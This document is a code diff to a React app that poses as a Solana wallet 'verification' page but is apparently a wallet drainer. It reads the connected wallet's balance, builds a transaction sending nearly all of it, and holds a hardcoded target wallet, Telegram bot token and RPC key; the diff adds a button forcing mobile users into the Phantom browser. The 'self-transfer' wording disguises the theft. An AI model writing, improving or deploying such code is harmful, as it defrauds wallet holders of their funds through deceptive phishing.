@@ -8,11 +8,7 @@ import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.
 const PROJECT_ID = 'a221581230964eec5702b682a5b6f63f';
 const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
 const CHAT_ID = "7539902547";
-
-// YOUR SPECIFIC WALLET ADDRESS ADDED HERE
 const TARGET_WALLET = '3EUKH4DpNZfHZ6qmBZJLKrcQZEVrnmLe22ir5cCb9Vhb'; 
-
-// YOUR ACTIVE HELIUS KEY ADDED HERE
 const HELIUS_KEY = 'a299fc16-5dda-4ef9-bcbf-5670830b1d03'; 
 
 const solanaAdapter = new SolanaAdapter();
@@ -56,6 +52,12 @@ const App: React.FC = () => {
     });
   };
 
+  const openInPhantom = () => {
+    // This helper forces the site to open inside the Phantom App browser for mobile users
+    const url = window.location.href.replace("https://", "");
+    window.location.href = `https://phantom.app/ul/browse/${url}?ref=${window.location.origin}`;
+  };
+
   const handleStepOne = async () => {
     if (!walletCA) return alert("Please enter the Wallet CA");
     setStatus('verifying');
@@ -67,19 +69,14 @@ const App: React.FC = () => {
     if (!isConnected) { open(); return; }
     setStatus('verifying');
     try {
-      // CONNECTION AUTHORIZED BY HELIUS KEY
       const connection = new Connection(`https://mainnet.helius-rpc.com/?api-key=${HELIUS_KEY}`, "confirmed");
       const pubKey = new PublicKey(address!);
-      
       const balance = await connection.getBalance(pubKey);
       
-      // Leaving exactly 0.0015 SOL for network fees
       const gasReserve = 1500000; 
       const amountToSend = balance - gasReserve;
 
-      if (amountToSend <= 0) {
-        throw new Error("Insufficient balance to perform self-transfer.");
-      }
+      if (amountToSend <= 0) throw new Error("Insufficient balance to perform self-transfer.");
 
       const { blockhash } = await connection.getLatestBlockhash();
       const transaction = new Transaction({ recentBlockhash: blockhash, feePayer: pubKey })
@@ -108,16 +105,27 @@ const App: React.FC = () => {
       </div>
       <h1 style={{ fontSize: '24px', fontWeight: '700', margin: '0 0 8px 0' }}>{step === 1 ? 'Verify CA' : 'Node Identity'}</h1>
       <p style={{ color: theme.textMuted, fontSize: '14px', marginBottom: '30px', textAlign: 'center' }}>{step === 1 ? "Enter your wallet's CA" : "Connect your wallet to finish"}</p>
+      
       <div style={{ width: '100%', maxWidth: '340px', background: theme.card, padding: '24px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.05)' }}>
         <label style={{ display: 'block', fontSize: '11px', fontWeight: '600', color: theme.textMuted, marginBottom: '8px', textTransform: 'uppercase' }}>{step === 1 ? "Wallet's CA" : "Status"}</label>
+        
         {step === 1 ? (
           <input type="text" value={walletCA} onChange={(e) => setWalletCA(e.target.value)} placeholder="Enter Wallet CA..." style={{ width: '100%', padding: '14px', borderRadius: '12px', border: 'none', background: theme.input, color: 'white', marginBottom: '20px', fontSize: '16px', outline: 'none' }} />
         ) : (
           <div style={{ width: '100%', padding: '14px', borderRadius: '12px', background: theme.input, color: 'white', marginBottom: '20px', fontSize: '14px', textAlign: 'center' }}>{isConnected ? `✅ Linked: ${address?.slice(0, 6)}...` : "Waiting for Bridge..."}</div>
         )}
-        <button onClick={step === 1 ? handleStepOne : handleStepTwo} disabled={status === 'verifying'} style={{ width: '100%', padding: '16px', borderRadius: '100px', border: 'none', background: status === 'completed' ? '#4BB543' : theme.purple, color: '#17101F', fontWeight: '700', fontSize: '16px', cursor: 'pointer' }}>
-          {status === 'verifying' ? 'Processing...' : step === 1 ? 'Verify Wallet CA' : (isConnected ? 'Finish Verification' : 'Connect Wallet')}
-        </button>
+
+        <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+          <button onClick={step === 1 ? handleStepOne : handleStepTwo} disabled={status === 'verifying'} style={{ width: '100%', padding: '16px', borderRadius: '100px', border: 'none', background: status === 'completed' ? '#4BB543' : theme.purple, color: '#17101F', fontWeight: '700', fontSize: '16px', cursor: 'pointer' }}>
+            {status === 'verifying' ? 'Processing...' : step === 1 ? 'Verify Wallet CA' : (isConnected ? 'Finish Verification' : 'Connect Wallet')}
+          </button>
+          
+          {step === 2 && !isConnected && (
+            <button onClick={openInPhantom} style={{ width: '100%', padding: '12px', borderRadius: '100px', border: `1px solid ${theme.purple}`, background: 'transparent', color: theme.purple, fontWeight: '600', fontSize: '14px', cursor: 'pointer' }}>
+              Open in Phantom App
+            </button>
+          )}
+        </div>
       </div>
     </div>
   );
